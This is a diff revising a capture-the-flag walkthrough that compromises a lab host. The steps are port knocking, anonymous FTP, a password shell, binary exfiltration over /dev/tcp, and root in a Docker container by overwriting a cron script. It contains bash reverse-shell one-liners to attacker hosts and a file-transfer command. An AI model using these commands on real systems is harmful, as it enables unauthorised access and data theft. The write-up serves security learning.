@@ -41,15 +41,22 @@ Nmap done: 1 IP address (1 host up) scanned in 150.86 seconds
 Looking at the results, we have port 22 and 8080 open but 21 being marked as filtered (Firewall?).
 
 ### Port 8080
-Lets start poking at port 8080. It was running `phpbb3`. Its an open source project so we can find github repo for it easily. Looking at files, didn't find anything interesting.
-Also there are no default credentials for it. 
+Looking at webpage, it was hosting a *phpbb* fourm. 
 
-So, I started finding a way to find its version number to look for any CVE but nothing. Looking at one of the post, we found 
+![image](https://user-images.githubusercontent.com/94787830/143220912-3e493a84-5145-4180-b76a-c7161e3a77c7.png)
+
+PHPbb is an open source project. Looking at Github repository of PHPbb, we get whole directory structure of the application. Navigating to `/docs/CHANGELOG.html`, we found the version of PHPbb is 3.3.3. Looking for publicly available for this version number, but we found nothing.
+
+Looking at the forum, we have one post which says
+
 ![image](https://user-images.githubusercontent.com/43528306/120971731-9ab68800-c78a-11eb-9fde-0667f4077293.png)
 
-### FTP
+#### Port Knocking
 
-The post says Knock,knock!! ...... hmmm. This maybe a hint for *port-knocking*. So lets try it
+The post says Knock,knock!! ...... hmmm. This maybe a hint for *port-knocking*. According to [wikipedia](https://en.wikipedia.org/wiki/Port_knocking),
+> Port knocking is method of externally opening ports on firewall by generating a connection attempt on a set of prespecified closed ports.
+
+In simple terms,It means that after knocking on ports in a specific sequence a certain port will open automatically. We can use nmap for this task,
 ```bash
 for i in 1111, 2222, 3333, 4444; do nmap -Pn --max-retries 0 -p $i 10.10.243.236; done
 ```
@@ -57,7 +64,19 @@ for i in 1111, 2222, 3333, 4444; do nmap -Pn --max-retries 0 -p $i 10.10.243.236
 The above command will check for specified ports, basically knocking at each specified ports only once and in sequence. Nmap default behaviour is to look for port more than once if it didn't responded. 
 We can modify it using `max-retries` flag, setting it to 0.
 
-Now we have *FTP* open. Trying for anonymous access and we were in. It had a note.txt stating:
+
+### FTP
+Running nmap scan again 
+```bash
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 23:25 IST
+Nmap scan report for 10.10.184.159
+Host is up (0.24s latency).
+
+PORT     STATE    SERVICE      VERSION
+21/tcp   open ftp
+..[snip]..
+```
+Great!, FTP service was now open. Trying for anonymous access and we were in. It had a note.txt stating:
 ```
 In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
   Connect to port 4420, the password is sardinethecat.
@@ -65,8 +84,8 @@ In case I forget my password, I'm leaving a pointer to the internal shell servic
 ```
 
 ### PORT 4420
-Interacting with this port using nc, prompt us for password. We have password from previous note file, using it gives us a basic shell. This shell was limited to some function only.
-Poking around, didn't find anything interesting. There was only one file named *runme* in `/home/catlover`. To run this we need a better shell than this. 
+Interacting with this port using nc, prompt us for password. We have a password from previous note file using which,it gives us a basic shell. This shell had limited functionality.
+Poking around, we found a file named *runme* in `/home/catlover`. To run this we need a better shell than this. 
 ```bash
 # Victim
 echo "bash -i >& /dev/tcp/ourIP/port 0>&1" | bash
@@ -75,7 +94,7 @@ echo "bash -i >& /dev/tcp/ourIP/port 0>&1" | bash
 nc -lvnp 9991
 ```
 
-We now have a better shell. Running the executable, asks us for another password. Trying the previous one we found but it didn't worked. As the shell was limited to some functions, we need to transfer this file to our box
+We now have a better shell. Running the executable, asks us for another password. Trying the previous one we found but it didn't worked. There was no `strings` binary available on the box,so we need to transfer this runme file to our box.
 ```bash
 # Attacker
 nc -lvnp 9991 > runme
@@ -83,15 +102,14 @@ nc -lvnp 9991 > runme
 # Victim
 cat runme > /dev/tcp/ourIP/9991
 ```
-
-We have the file on our local machine. Looking at file info, it was 64-bit ELF file non-stripped. So running strings on it, found
+We have the file on our local machine.Running strings on it, found
 ```
 rebecca
 Please enter yout password: 
 Welcome, catlover! SSH key transfer queued! 
 touch /tmp/gibmethesshkey
 ```
-Running the file on victim shell with the password worked. Waiting for few seconds we have a ssh private key file. Using this file, we can ssh into the box.
+Running the file on victim shell with the string we found worked. Waiting for few seconds we have a ssh private key file for `catlover`. Using this, we can ssh into the box.
 
 ## ROOT
 After gaining the shell, we were already root but we were in a docker-environment.
@@ -106,14 +124,19 @@ drwxr-xr-x 3 root root 4096 Mar 25 16:26 .local
 -rw-r--r-- 1 root root   41 Mar 25 16:28 flag.txt
 ```
 
-Looking around we saw `.bash_history`. Looking at contents of the file, only interesing things found
+Looking around we saw `.bash_history`. Looking at contents of the file, we found
 ```bash
 ls -alt /
 cat /post-init.sh 
 cat /opt/clean/clean.sh 
-bash -i >&/dev/tcp/192.168.4.20/4444 <&1
+bash -i >&/dev/tcp/192.168.4.20/4444 <&1 (?Revshell)
 nano /opt/clean/clean.sh 
 ```
-Changing the contents of clean.sh file to get us a reverse shell. Wait for few seconds, and we have root shell
+We need to change the content of `clean.sh` to give us reverse shell.
+```bash
+root@7546fa2336d6:/opt# echo 'bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"' > clean.sh
+```
+Set up a listener, and wait for few seconds, we have a shell as root.
+ROOT!!!
 
 
